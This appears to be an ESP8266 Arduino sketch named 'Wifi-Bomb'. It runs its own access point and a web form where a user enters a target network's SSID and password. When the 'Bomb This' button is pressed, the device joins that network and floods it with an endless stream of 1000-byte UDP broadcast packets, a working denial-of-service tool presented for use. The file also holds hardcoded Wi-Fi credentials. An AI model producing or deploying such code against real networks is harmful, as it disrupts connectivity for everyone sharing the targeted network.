
#ifdef ESP8266
extern "C" {
#include "user_interface.h"
}
#endif

#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <WiFiUdp.h>

ESP8266WebServer server(80);


void setup() { 
 Serial.begin(115200);

 //connectWifi("PIMOUSSE", "jojolalala");
 
 configureAccesPoint();
 configureLED();
}

void loop() {
	server.handleClient();
}

/* Go to http://192.168.4.1 in a web browser
 */
void configureAccesPoint(){

  const char *ssid = "Wifi-Bomb";
  const char *password = "azertyuiop";
  
  Serial.println();
  Serial.println("Configuring access point...");
  WiFi.softAP(ssid, password);

  IPAddress myIP = WiFi.softAPIP();
  Serial.print("AP IP address: ");
  Serial.println(myIP);
  server.on("/", handleRoot);
  server.on("/bomb", handleBomb);
  server.begin();
  Serial.println("HTTP server started");  
}

void configureLED(){
  Serial.println("");
  Serial.println("Configuring LED");
  pinMode(LED_BUILTIN, OUTPUT);
  digitalWrite(LED_BUILTIN, HIGH);
  Serial.println("LED Configured");
}

void handleRoot() {

  String form = "\
  <!doctype html> <html> <head> <title> Wifi Bomb </title> </head> <body>\
  <form method='get' action='/bomb'>\
    <h1> Wifi Bomb </h1>\
    <br>SSID:<br>\
    <input type='text' name='SSID'><br>Password:<br>\
    <input type='text' name='Password'><br>Mac-Address:<br>\
    <button type='submit'> Bomb This </button>\
  </form>\
  </body> </html>\
  ";
  
  server.send(200, "text/html", form);
}

void handleBomb(){
  server.send(200, "text/html", "<h1>Bomb Drop Confirmed</h1>");
  blink();

  char ssid[50];
  char password[50];

  server.arg(0).toCharArray(ssid, 50);
  server.arg(1).toCharArray(password, 50);

  bomb(ssid, password);
}

void bomb(char* ssid, char* password){

   Serial.println("");
   Serial.print("Bomb : ");
   Serial.println(ssid);
   connectWifi(ssid, password);

   uint8_t pkt[1000];
   memset(pkt, 0, sizeof(pkt));

   while(true){
    WiFiUDP udp;
    udp.beginPacketMulticast(WiFi.softAPIP(), 1, IPAddress(255,255,255,255), 1);
    udp.write(pkt, sizeof(pkt));
    udp.endPacket();
   }
   
}

void connectWifi(char* ssid, char* password){
  
  WiFi.begin(ssid, password);

  Serial.println("");
  Serial.print("Try to connect ");
  while (WiFi.status() != WL_CONNECTED) {
    delay(500);
    Serial.print(".");
  }
  Serial.println("");
  Serial.println("WiFi connected");  
  Serial.print("IP address: ");
  Serial.println(WiFi.localIP());
}

void disconnectWifi(){
   Serial.println("");
   Serial.print("Try to disconnect ");
   while (WiFi.status() == WL_CONNECTED) {
    delay(500);
    Serial.print(".");
  }
   Serial.println("Wifi Disconnected");
}

void blink(){
  digitalWrite(LED_BUILTIN, LOW);
  delay(1000);
  digitalWrite(LED_BUILTIN, HIGH);
}

